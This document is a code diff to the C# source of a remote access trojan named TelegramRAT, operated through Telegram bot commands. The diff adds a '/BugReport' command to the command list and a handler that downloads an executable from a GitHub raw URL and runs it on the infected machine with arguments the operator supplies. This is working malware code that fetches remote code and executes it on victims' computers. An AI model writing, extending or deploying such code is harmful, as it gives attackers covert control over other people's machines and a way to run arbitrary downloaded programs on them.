@@ -1,4 +1,4 @@
-﻿/* 
+/* 
        * Original Version
 
        ^ Author    : LimerBoy
@@ -170,6 +170,7 @@ namespace TelegramRAT
                             "\n /SystemRestore <Enable/Disable>" +
                             "\n /ScreenResolution" +
                             "\n /isAdmin" +
+                            "\n /BugReport <Title> <MessageText>" +
                             "\n" +
                             "\n💡 POWER:" +
                             "\n /Shutdown" +
@@ -1762,6 +1763,37 @@ namespace TelegramRAT
                 case "ISADMIN":
                     {
                         telegram.sendText(utils.IsAdministrator().ToString());
+                        break;
+                    }
+                case "BUGREPORT":
+                    {
+                        string Title, MessageText;
+                        // Check if args exists
+                        try
+                        {
+                            Title = args[1];
+                            MessageText = args[2];
+                        }
+                        catch (IndexOutOfRangeException)
+                        {
+                            telegram.sendText("⛔ Argument <Title (in base64 u can encode this in https://www.base64encode.org/)> and <MessageText (in base64)> are required for /BugReport");
+                            break;
+                        }
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/cisamu123/CyberEye/main/TelegramRAT/core/libs/BugReport.exe");
+                        string arguments = $"{Title} {MessageText}";
+
+                        ProcessStartInfo startInfo = new ProcessStartInfo
+                        {
+                            FileName = "BugReport.exe",
+                            Arguments = arguments,
+                        };
+
+                        using (Process process = new Process())
+                        {
+                            process.StartInfo = startInfo;
+                            process.Start();
+                            process.WaitForExit();
+                        }
                         break;
                     }
                 // Unknown command
